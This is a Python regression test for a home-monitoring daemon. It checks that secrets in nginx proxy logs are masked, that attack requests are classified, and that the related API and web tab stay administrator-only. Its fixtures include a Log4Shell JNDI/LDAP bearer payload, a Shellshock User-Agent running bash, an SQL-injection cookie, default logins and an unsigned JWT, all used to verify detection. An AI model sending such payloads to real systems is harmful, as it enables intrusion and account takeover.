"""5.46: the full logs of the server in front, whole but for their secrets.

    python3 test/review546_fullmask.py

What is checked, each of which fails on 5.45.0:

  * a secret is written by its shape: a Basic login, a JWT, a bearer token, a
    cookie, a link's secret, an X-Api-Key, a password in a body or a query;
    masked twice is masked once (full_mask, mask_auth, mask_cookie, ...)
  * a line written by a config from before 5.46 - Cookie and Basic as they
    came - is masked as it is READ: nothing of it reaches the table, the log
    or the answer (proxy_sweep over a stand-in for the server in front)
  * every request is kept (proxy_requests), the same line twice is two
    requests, the same file read again from its start is kept once
  * the headers are weighed: a login everybody knows tried and refused, a
    JWT that signs itself off, a payload in the User-Agent or in a cookie as
    the front config's map says it carried - and the house's own login,
    answered 200, is not
  * /api/proxy/requests answers an administrator, filtered, and nobody else
  * the front configs: real nginx (where installed) writes no secret whole,
    and writes the shapes the house reads
  * the Public API tab shows the card, the rows and a row's headers, masked

Every address and secret below is made up. Ports 19290 (the daemon), 19291
(php -S) and 19292-19293 (nginx).
"""
import base64
import json
import os
import re
import shutil
import socket
import sqlite3
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.request
from pathlib import Path

HERE = Path(__file__).resolve().parent.parent
W = Path(tempfile.mkdtemp(prefix='zigmon-review546-'))
API_PORT, PHP_PORT, NGX_PORT, NGX_BACK = 19290, 19291, 19292, 19293
bad = []
PROCS = []


def check(ok, what):
    if not ok:
        bad.append(what)
        print('  FAILED: ' + what)
    return ok


def sh(cmd, **kw):
    return subprocess.run(cmd, capture_output=True, text=True, stdin=subprocess.DEVNULL, **kw)


def finish():
    for p in PROCS:
        p.terminate()
        try:
            p.wait(5)
        except subprocess.TimeoutExpired:
            p.kill()
            p.wait()
    shutil.rmtree(W, ignore_errors=True)
    print('review546_fullmask: %s' % ('FAILED (%d)' % len(bad) if bad else 'ok'))
    os._exit(1 if bad else 0)


sys.path.insert(0, os.environ.get('REVIEW546_DAEMON') or str(HERE))
sys.argv = ['zigmon']
import zigmon                                           # noqa: E402

if not hasattr(zigmon, 'full_mask'):
    check(False, 'there is no full_mask: the full logs are weighed with their secrets as they came')
    finish()

zigmon.load_config()
zigmon.CONFIG.update({'db_file': str(W / 'z.db'), 'api_port': API_PORT, 'api_host': '127.0.0.1',
                      'token_file': str(W / 'token'), 'pin': '', 'plugs': [], 'sensors': [],
                      'mqtt_host': '', 'log_file': str(W / 'zigmon.log'), 'log_to_journal': False,
                      'state_dir': str(W / 'state'), 'never_block': '', 'block_ladder': '',
                      'block_mode': 'temporary', 'blacklist': 1, 'block_score': 15, 'feeds_ban': 0,
                      'feeds': '', 'intel_shodan': 0, 'intel_on_block': 0, 'mikrotik_host': '',
                      'mikrotik_list': '', 'trusted_proxies': '', 'proxy_host': '', 'debug': 1})
(W / 'state').mkdir()
d = zigmon.Daemon()
d.notify = lambda *a, **k: None
d.mikrotik_after_change = lambda *a, **k: None
d.feed_wanted = lambda: []
d.proxy_run = lambda command: ''

# the secrets of this made-up house, which must never be seen whole again
PASSWORD = 'Kq7-ripe-otter-91'
HOUSE_BASIC = 'Basic ' + base64.b64encode(('phone:' + PASSWORD).encode()).decode()
SESSION = 'f3a9c1d2e8b74a6f9c0d1e2f3a4b5c6d'
LINK = 'Zt4xQ9wLmP2vR8kS'
APIKEY = 'ak_live_7f8e9d0c1b2a3948'
BODYPW = 'hunter2-blue-kettle'
WHOLE = (PASSWORD, SESSION, LINK, APIKEY, BODYPW, HOUSE_BASIC.split(' ')[1])

print('the shapes')
m, said = zigmon.mask_auth(HOUSE_BASIC)
check(m.startswith('Basic user:phone ') and PASSWORD not in m and m.endswith(PASSWORD[-2:]),
      'a Basic login is not "Basic user:<name> •<last two>": %r' % m)
m, said = zigmon.mask_auth('Basic ' + base64.b64encode(b'admin:admin').decode())
check(said.get('authk') == 'admin:admin', 'admin:admin is not known as a login everybody knows: %r' % said)
m, said = zigmon.mask_auth('Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIn0.')
check(m == 'Bearer jwt:eyJhbGciOiJub25lIn0 unsigned', 'an unsigned JWT: %r' % m)
m, _ = zigmon.mask_auth('Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.' + SESSION)
check('eyJzdWIiOiIxIn0' not in m and SESSION not in m and m.endswith(SESSION[-2:]),
      'a signed JWT keeps its claims or its signature: %r' % m)
m, said = zigmon.mask_auth('Bearer ${jndi:ldap://203.0.113.9/a}')
check('jndi' in said.get('authlook', '') and 'ldap' not in m, 'a payload in a bearer: %r %r' % (m, said))
for nginx_form in ('Basic *', 'Bearer *Zk', 'Bearer jwt:eyJhbGciOiJIUzI1NiJ9 *Zk', 'sent', 'none'):
    once, _ = zigmon.mask_auth(nginx_form)
    twice, _ = zigmon.mask_auth(once)
    check(once == twice and '*' not in once, 'the front config\'s %r is read as %r, then %r' % (nginx_form, once, twice))
c, said = zigmon.mask_cookie('PHPSESSID=%s; csrftoken=%s; theme=dark' % (SESSION, LINK))
check(c == 'names: PHPSESSID csrftoken theme' and not said.get('cookielook'), 'a cookie: %r %r' % (c, said))
c, said = zigmon.mask_cookie("sid=' or '1'='1")
check(said.get('cookielook', '').startswith('sqli'), 'SQL in a cookie is not seen: %r' % said)
check(zigmon.mask_token(LINK) == '•' + LINK[-2:] and zigmon.mask_token('abc') == '•',
      'a token: %r, a short one: %r' % (zigmon.mask_token(LINK), zigmon.mask_token('abc')))
p = zigmon.mask_pairs('/tap/%s?x=1&token=%s&spin=4&password=%s' % (LINK, SESSION, BODYPW))
check(LINK not in p and SESSION not in p and BODYPW not in p and 'spin=4' in p and 'x=1' in p,
      'an address: %r' % p)
p = zigmon.mask_pairs(json.dumps({'username': 'jan', 'password': BODYPW, 'api_key': APIKEY, 'q': 'lamp'}))
check(BODYPW not in p and APIKEY not in p and '"jan"' in p and '"lamp"' in p, 'a JSON body: %r' % p)
one = zigmon.full_mask({'ip': '203.0.113.5', 'auth': HOUSE_BASIC, 'cookie': 'sid=' + SESSION,
                        'secret': LINK, 'code': '123456', 'apikey': APIKEY, 'x_my_session': SESSION,
                        'body': 'pin=1234&password=' + BODYPW, 'ua': 'curl/8'})
flat = json.dumps(one)
check(not any(s in flat for s in WHOLE) and one.get('code') == 'sent' and '1234' not in flat,
      'full_mask leaves something whole: %s' % flat)
check(zigmon.full_mask(one) == one, 'masked twice is not masked once')

# ---- a sweep over a server in front still on the old config ----------------
print('a reading from an old config')
T0 = time.time()


def iso(ago):
    return time.strftime('%Y-%m-%dT%H:%M:%S', time.localtime(T0 - ago)) + time.strftime('%z')[:3] + ':' + \
        time.strftime('%z')[3:]


def line(ip, ago, m='GET', u='/', s=404, **kw):
    one = {'ip': ip, 't': iso(ago), 'm': m, 'u': u, 's': s, 'host': 'tap.example.net', 'ua': 'Mozilla/5.0',
           'secret': 'none', 'code': 'none', 'auth': '', 'cookie': '', 'body': ''}
    one.update(kw)
    return json.dumps(one)


ADMIN_B = 'Basic ' + base64.b64encode(b'admin:admin').decode()
ROOT_B = 'Basic ' + base64.b64encode(b'root:toor').decode()
OLD = [
    # the house: a phone pressing a link, and the phone at ntfy with its login
    line('198.51.100.20', 300, 'POST', '/tap', 200, secret=LINK, body='{"x":1}'),
    line('198.51.100.20', 290, 'GET', '/house/json', 200, auth=HOUSE_BASIC, which='ntfy'),
    line('198.51.100.20', 289, 'GET', '/house/json', 200, auth=HOUSE_BASIC, which='ntfy',
         cookie='PHPSESSID=' + SESSION),
    # a list of logins worked through
    line('203.0.113.41', 200, 'GET', '/', 401, auth=ADMIN_B, which='ntfy'),
    line('203.0.113.41', 199, 'GET', '/', 401, auth=ROOT_B, which='ntfy'),
    # a forged token
    line('203.0.113.42', 150, 'GET', '/v1/account', 401, auth='Bearer eyJhbGciOiJub25lIn0.eyJ1IjoiYSJ9.'),
    # shellshock in the agent
    line('203.0.113.43', 100, 'GET', '/cgi-bin/x', 404, ua='() { :; }; /bin/bash -c "id"'),
    # a password in a form, and an api key
    line('203.0.113.44', 90, 'POST', '/login?token=' + SESSION, 404, body='user=a&password=' + BODYPW,
         apikey=APIKEY, ct='application/x-www-form-urlencoded'),
    # one request sent twice in the same second: two lines alike
    line('203.0.113.45', 80, 'GET', '/a', 404),
    line('203.0.113.45', 80, 'GET', '/a', 404),
    # what the 5.46 front config writes: a cookie carrying SQL, said by its map
    line('203.0.113.46', 70, 'GET', '/b', 404, cookie='names: sid', cookielook='sqli', cookiesize='s'),
    'not json at all ' + PASSWORD,
]
zigmon.CONFIG.update({'proxy_full_watch': 1, 'proxy_full_log': '/var/log/nginx/zigmon-tap-full.log',
                      'ntfy_full_log': ''})
d.proxy_read = lambda whole=False: []
d.proxy_read_errors = lambda: []
d.proxy_read_named = lambda setting, mark: list(OLD) if setting == 'proxy_full_log' else []
d.proxy_sweep()
db = sqlite3.connect(str(W / 'z.db'))
db.row_factory = sqlite3.Row
rows = [dict(r) for r in db.execute('SELECT * FROM proxy_requests ORDER BY id')]
check(len(rows) == 11, '%d requests kept of 11 lines of JSON (the same line twice is two)' % len(rows))
dump = json.dumps(rows)
check(not any(s in dump for s in WHOLE), 'a secret is in the table whole: %s' %
      [s[:4] for s in WHOLE if s in dump])
logged = (W / 'zigmon.log').read_text(errors='replace') if (W / 'zigmon.log').exists() else ''
check(not any(s in logged for s in WHOLE), 'a secret is in the daemon\'s log whole')
anoms = [dict(r) for r in db.execute('SELECT * FROM anomalies')] if db.execute(
    "SELECT name FROM sqlite_master WHERE name='anomalies'").fetchone() else []
check(not any(s in json.dumps(anoms) for s in WHOLE), 'a secret is in the anomalies whole')
d.proxy_sweep(whole=True)
check(db.execute('SELECT COUNT(*) FROM proxy_requests').fetchone()[0] == 11,
      'the same lines read again were kept a second time')


def kinds_of(ip):
    return {k for r in rows if r['ip'] == ip for k in (r['kinds'] or '').split(',') if k}


check('proxy-default-login' in kinds_of('203.0.113.41'), 'admin:admin and root:toor refused, not weighed: %r'
      % kinds_of('203.0.113.41'))
check(not kinds_of('198.51.100.20'), 'the house\'s own phone is weighed: %r' % kinds_of('198.51.100.20'))
check('proxy-forged-token' in kinds_of('203.0.113.42'), 'an unsigned JWT is not weighed: %r' % kinds_of('203.0.113.42'))
check('proxy-payload' in kinds_of('203.0.113.43'), 'shellshock in the agent is not weighed: %r' % kinds_of('203.0.113.43'))
check('proxy-payload' in kinds_of('203.0.113.46'), 'SQL in a cookie, as the map said, is not weighed: %r'
      % kinds_of('203.0.113.46'))
house = [r for r in rows if r['ip'] == '198.51.100.20' and r['which'] == 'ntfy']
check(house and json.loads(house[0]['fields']).get('auth', '').startswith('Basic user:phone •'),
      'the house\'s login is not kept by its shape: %r' % (house and house[0]['fields']))
check(d.weigh_one({'ip': '203.0.113.47', 'm': 'GET', 'u': '/c', 's': 404}) is not None
      and db.execute("SELECT COUNT(*) FROM proxy_requests WHERE ip='203.0.113.47'").fetchone()[0] == 0,
      'a press weighed where it arrives is kept as a second copy of the full log\'s line')
check(all(k in d.ANOMALY_WEIGHT and k in d.BLOCK_WEIGHT and k in d.ANOMALY_WORDS
          for k in ('proxy-default-login', 'proxy-forged-token')), 'a new kind is not weighed, ranked or worded')

# ---- over HTTP -------------------------------------------------------------
print('the API')
check('/api/proxy/requests' in d.__class__.__dict__.get('ALWAYS_LOCKED', ()) or
      '/api/proxy/requests' in zigmon.ApiHandler.ALWAYS_LOCKED, 'the requests are not an administrator\'s')
api = zigmon.ApiServer(d)
api.start()
time.sleep(0.3)


def login(name, password):
    req = urllib.request.Request('http://127.0.0.1:%d/api/auth/login' % API_PORT,
                                 data=json.dumps({'name': name, 'password': password}).encode(),
                                 headers={'X-Zigmon-Token': d.token, 'Content-Type': 'application/json',
                                          'X-Zigmon-Client': '192.168.40.10'}, method='POST')
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.loads(r.read()).get('token') or ''


def get(path, session=''):
    req = urllib.request.Request('http://127.0.0.1:%d%s' % (API_PORT, path),
                                 headers={'X-Zigmon-Token': d.token, 'X-Zigmon-Session': session,
                                          'X-Zigmon-Client': '192.168.40.10'})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b'{}')


d.account_add('owner', 'admin', 'owner pass 12', must_change=False, quiet=True)
d.account_add('watcher', 'viewer', 'watcher pass 12', must_change=False, quiet=True)
S_ADMIN = login('owner', 'owner pass 12')
S_VIEW = login('watcher', 'watcher pass 12')
code, ans = get('/api/proxy/requests', S_VIEW)
check(code == 403 and 'rows' not in ans, 'a viewer is answered the requests: %s %r' % (code, str(ans)[:120]))
code, ans = get('/api/proxy/requests')
check(code == 403, 'nobody signed in is answered the requests: %s' % code)
code, ans = get('/api/proxy/requests', S_ADMIN)
check(code == 200 and len(ans.get('rows') or []) == 11 and ans.get('watching') is True,
      'an administrator: %s, %d rows' % (code, len(ans.get('rows') or [])))
check(not any(s in json.dumps(ans) for s in WHOLE), 'the answer holds a secret whole')
code, ans = get('/api/proxy/requests?ip=203.0.113.41&found=1', S_ADMIN)
check(code == 200 and [r['ip'] for r in ans['rows']] == ['203.0.113.41'] * 2
      and 'proxy-default-login' in ans.get('words', {}), 'filtered by address: %r' % ans.get('rows'))
code, ans = get('/api/proxy/requests?q=bin%2Fbash', S_ADMIN)
check(code == 200 and [r['ip'] for r in ans['rows']] == ['203.0.113.43'], 'found by its agent: %r' % ans.get('rows'))
code, ans = get('/api/proxy/requests?limit=4', S_ADMIN)
code2, ans2 = get('/api/proxy/requests?limit=4&before=%d' % ans['rows'][-1]['id'], S_ADMIN)
check(ans.get('more') and len(ans2['rows']) == 4 and ans2['rows'][0]['id'] < ans['rows'][-1]['id'],
      'the pages do not follow on: %r' % [(r['id']) for r in ans2.get('rows', [])])
code, ans = get('/api/proxy/requests?ip=not-an-address', S_ADMIN)
check(code == 400, 'a word for an address is answered %s' % code)

# ---- the front configs in a real nginx -------------------------------------
print('the front configs')
for f, p in (('nginx-tap-front.conf', 'tap'), ('nginx-ntfy-front.conf', 'ntfy')):
    text = (HERE / 'deploy' / f).read_text()
    fmt = text.split('log_format %sfull' % p)[1].split("';")[0]
    for raw in ('$http_authorization', '$http_cookie', '$http_x_zigmon_tap', '$http_x_zigmon_code',
                '$request_body', '$request_uri', '$http_referer', '$http_x_api_key', '$http_proxy_authorization'):
        check(raw not in fmt, '%s writes %s whole' % (f, raw))
    for shape in ('_authk', '_authlook', '_cookielook', '_cookie"', '_body"', '_uri"', 'sec_fetch_site'):
        check(shape in fmt, '%s does not write %s' % (f, shape))
if not shutil.which('nginx'):
    print('  SKIPPED: no nginx here')
else:
    N = W / 'ngx'
    (N / 'logs').mkdir(parents=True)
    (N / 'tmp').mkdir()
    maps = []
    for f in ('nginx-tap-front.conf', 'nginx-ntfy-front.conf'):
        text = (HERE / 'deploy' / f).read_text()
        # the maps and the log format, as they stand in the file
        for block in re.finditer(r'(?ms)^map \$\S+ \$\S+ \{.*?^\}\n|^log_format \w+ escape=json\n.*?\';\n', text):
            maps.append(block.group(0))
    (N / 'front.conf').write_text('\n'.join(maps))
    (N / 'nginx.conf').write_text('''worker_processes 1; pid %(n)s/nginx.pid; error_log %(n)s/logs/error.log; daemon on;
events {}
http { client_body_temp_path tmp; proxy_temp_path tmp; fastcgi_temp_path tmp; uwsgi_temp_path tmp; scgi_temp_path tmp;
  include %(n)s/front.conf;
  server { listen 127.0.0.1:%(p)d; access_log %(n)s/logs/tap.log tapfull; access_log %(n)s/logs/ntfy.log ntfyfull;
    location / { proxy_pass http://127.0.0.1:%(b)d; } }
  server { listen 127.0.0.1:%(b)d; access_log off; location / { return 200 ok; } }
}
''' % {'n': N, 'p': NGX_PORT, 'b': NGX_BACK})
    got = sh(['nginx', '-p', str(N), '-c', str(N / 'nginx.conf')])
    if not check(got.returncode == 0, 'nginx would not start with the front maps: %s' % (got.stderr[-400:])):
        pass
    else:
        def send(path, headers=None, body=None):
            req = urllib.request.Request('http://127.0.0.1:%d%s' % (NGX_PORT, path), data=body,
                                         headers=headers or {}, method='POST' if body else 'GET')
            try:
                urllib.request.urlopen(req, timeout=10).read()
            except urllib.error.URLError:
                pass
        send('/a', {'Authorization': HOUSE_BASIC, 'Cookie': 'PHPSESSID=%s; csrftoken=%s' % (SESSION, LINK)})
        send('/b', {'Authorization': ADMIN_B})
        send('/c', {'Authorization': 'Bearer eyJhbGciOiJub25lIn0.eyJ1IjoiYSJ9.'})
        send('/tap', {'X-Zigmon-Tap': LINK, 'X-Zigmon-Code': '123456', 'Content-Type': 'application/json'},
             json.dumps({'password': BODYPW, 'x': 1}).encode())
        send('/tap/%s?token=%s&password=%s' % (LINK, SESSION, BODYPW), {'X-Api-Key': APIKEY,
                                                                      'Referer': 'https://x.example/?sid=' + SESSION})
        send('/d', {'Cookie': "sid=' or '1'='1", 'User-Agent': '() { :; }; /bin/bash -c id'})
        time.sleep(0.5)
        try:
            os.kill(int((N / 'nginx.pid').read_text().strip()), 15)
        except (OSError, ValueError):
            pass
        written = (N / 'logs' / 'tap.log').read_text(errors='replace')
        check(len(written.splitlines()) == 6, 'nginx wrote %d lines for 6 requests' % len(written.splitlines()))
        check(not any(s in written for s in WHOLE) and '123456' not in written,
              'nginx wrote a secret whole: %s' % [s[:4] for s in WHOLE + ('123456',) if s in written])
        lines = [json.loads(x) for x in written.splitlines() if x.startswith('{')]
        by = {x['u'].split('?')[0]: x for x in lines}
        check(by.get('/a', {}).get('cookie') == 'names: PHPSESSID csrftoken' or
              by.get('/a', {}).get('cookie', '').split() == ['names:', 'PHPSESSID', 'csrftoken'],
              'the cookie names: %r' % by.get('/a', {}).get('cookie'))
        check(by.get('/b', {}).get('authk') == 'admin:admin', 'admin:admin by its map: %r' % by.get('/b'))
        check(by.get('/c', {}).get('auth', '').endswith(' unsigned'), 'the unsigned JWT: %r' % by.get('/c', {}).get('auth'))
        check(by.get('/tap', {}).get('secret') == '*' + LINK[-2:] and by['/tap'].get('code') == 'sent',
              'the link\'s secret: %r' % by.get('/tap'))
        check(by.get('/d', {}).get('cookielook') == 'sqli', 'SQL in the cookie by its map: %r' % by.get('/d'))
        # ...and read by the house as the shapes it knows
        read = [zigmon.full_mask(x) for x in lines]
        check(all('*' not in str(x.get('auth')) for x in read), 'the house does not read the front\'s marks')
        d.full_weigh([json.dumps(x) for x in lines], keep=False)
    print('  real nginx: %s' % ('ok' if not bad else 'see above'))

# ---- the page ----------------------------------------------------------------
print('the Public API tab')
shutil.copytree(HERE / 'web', W / 'web')
api_php = (W / 'web' / 'zigmon-api.php').read_text()
api_php = api_php.replace("const ZIGMON_PORT  = 9849;", "const ZIGMON_PORT  = %d;" % API_PORT)
api_php = api_php.replace("const ZIGMON_TOKEN = '/run/zigmon/api-token';", "const ZIGMON_TOKEN = '%s';" % (W / 'token'))
(W / 'web' / 'zigmon-api.php').write_text(api_php)
php = subprocess.Popen(['php', '-S', '127.0.0.1:%d' % PHP_PORT, str(W / 'web' / 'index.php')], cwd=str(W / 'web'),
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
                       env=dict(os.environ, PHP_CLI_SERVER_WORKERS='4'))
PROCS.append(php)
for _ in range(50):
    try:
        socket.create_connection(('127.0.0.1', PHP_PORT), 0.2).close()
        break
    except OSError:
        time.sleep(0.1)
SHOTS = os.environ.get('SHOTS') or str(W / 'shots')
os.makedirs(SHOTS, exist_ok=True)
js = r'''
const { chromium } = require('playwright');
const PORT = %(port)d, SH = %(shots)s;
async function open(b, session) {
  const ctx = await b.newContext({viewport: {width: 1400, height: 1100}});
  if (session) await ctx.addCookies([{name: 'zigmon_session', value: session, url: 'http://127.0.0.1:' + PORT + '/'}]);
  const p = await ctx.newPage();
  p.errors = [];
  p.on('pageerror', e => p.errors.push(String(e)));
  await p.goto('http://127.0.0.1:' + PORT + '/#approvals/requests');
  return p;
}
(async () => {
  const b = await chromium.launch();
  const r = {};
  const p = await open(b, %(s)s);
  try { await p.waitForSelector('#preq-table tbody tr.preq-row', {timeout: 20000}); } catch (e) { r.wait = String(e); }
  r.rows = await p.$$eval('#preq-table tbody tr.preq-row', t => t.length);
  r.kinds = await p.$$eval('#preq-table .preq-kind', t => t.map(x => x.textContent));
  r.older = await p.evaluate(() => document.querySelectorAll('#preq-pager button').length ? 'pages' : 'none');
  const card = await p.$('#preq-card');
  if (card) await card.scrollIntoViewIfNeeded();
  // the house's own request at ntfy, opened
  const rows = await p.$$('#preq-table tbody tr.preq-row');
  for (const tr of rows) { const t = await tr.innerText(); if (t.indexOf('198.51.100.20') >= 0 && t.indexOf('ntfy') >= 0) { await tr.click(); break; } }
  await p.waitForTimeout(300);
  r.detail = await p.evaluate(() => { const d = document.querySelector('#preq-table tr.preq-detail:not([hidden])'); return d ? d.innerText : ''; });
  if (card) await card.screenshot({path: SH + '/requests.png'});
  await p.fill('#preq-ip', '203.0.113.41');
  await p.click('#preq-go');
  await p.waitForTimeout(1200);
  r.filtered = await p.$$eval('#preq-table tbody tr.preq-row', t => t.map(x => x.innerText));
  r.html = await p.content();
  r.errors = p.errors;
  const v = await open(b, %(v)s);
  await v.waitForTimeout(2500);
  r.viewerCard = await v.evaluate(() => { const c = document.getElementById('preq-card'); return c ? !c.hidden : null; });
  r.verrors = v.errors;
  console.log(JSON.stringify(r));
  await b.close();
})().catch(e => { console.log(JSON.stringify({error: String(e)})); });
'''
(W / 'page.js').write_text(js % {'port': PHP_PORT, 'shots': json.dumps(SHOTS), 's': json.dumps(S_ADMIN),
                                 'v': json.dumps(S_VIEW)})
root = sh(['npm', 'root', '-g']).stdout.strip()
got = sh(['node', str(W / 'page.js')], timeout=240, env=dict(os.environ, NODE_PATH=root))
try:
    r = json.loads(got.stdout.strip().splitlines()[-1])
except (ValueError, IndexError):
    r = {'error': (got.stdout + got.stderr)[-400:]}
if r.get('error') and ('Executable doesn' in r['error'] or 'Cannot find module' in r['error']):
    print('  SKIPPED (no browser here): %s' % r['error'][:200])
else:
    check(not r.get('error'), 'the page: %s' % r.get('error'))
    check(r.get('rows') == 11, 'the card shows %r rows of 11 (%s)' % (r.get('rows'), r.get('wait', '')))
    check('proxy-default-login' in (r.get('kinds') or []), 'the weighed kinds are not shown: %r' % r.get('kinds'))
    det = r.get('detail') or ''
    check('Authorization' in det and 'Basic user:phone •' in det and 'Cookie' in det and 'PHPSESSID' in det,
          'a row opened does not show its headers: %r' % det[:400])
    check('\nnone' not in det, 'a row opened lists the headers that were not sent: %r' % det[:400])
    check(not any(s in (r.get('html') or '') for s in WHOLE), 'the page holds a secret whole')
    check(len(r.get('filtered') or []) == 2 and all('203.0.113.41' in x for x in r['filtered']),
          'filtered by address: %r' % r.get('filtered'))
    check(not r.get('errors') and not r.get('verrors'), 'errors on the page: %r %r' % (r.get('errors'), r.get('verrors')))
    check(r.get('older') == 'none', 'there are no older requests and "Older" is shown: %r' % r.get('older'))
    check(r.get('viewerCard') is False, 'a viewer sees the card: %r' % r.get('viewerCard'))
finish()
